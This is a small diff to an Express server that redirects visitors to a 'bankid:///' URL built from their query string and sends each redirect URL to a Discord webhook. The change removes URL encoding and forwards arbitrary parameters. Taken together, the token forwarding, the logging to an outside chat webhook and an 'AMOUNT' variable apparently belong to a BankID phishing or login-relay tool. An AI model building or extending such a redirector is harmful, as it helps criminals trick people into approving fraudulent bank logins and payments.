@@ -10,10 +10,16 @@ let AMOUNT = ""
 
 app.use(express.json());
 
-app.get('/:token', (req, res) => {
-  const token = req.params.token; // Get the token from path parameter
+app.get('/', (req, res) => {
+  // Extract the query string from req.originalUrl
+  const queryString = req.originalUrl.split('?')[1];
 
-  const redirectUrl = `bankid:///?autostarttoken=${encodeURIComponent(token)}`;
+  if (!queryString) {
+    return res.status(400).send('Query parameters are required.');
+  }
+
+  // Construct the redirect URL with all query parameters
+  const redirectUrl = `bankid:///?${queryString}`;
 
   // Log the redirect URL to Discord webhook
   sendDiscordWebhook(redirectUrl);
@@ -21,6 +27,7 @@ app.get('/:token', (req, res) => {
   // Redirect to the constructed URL
   res.redirect(redirectUrl);
 });
+
 
 
 
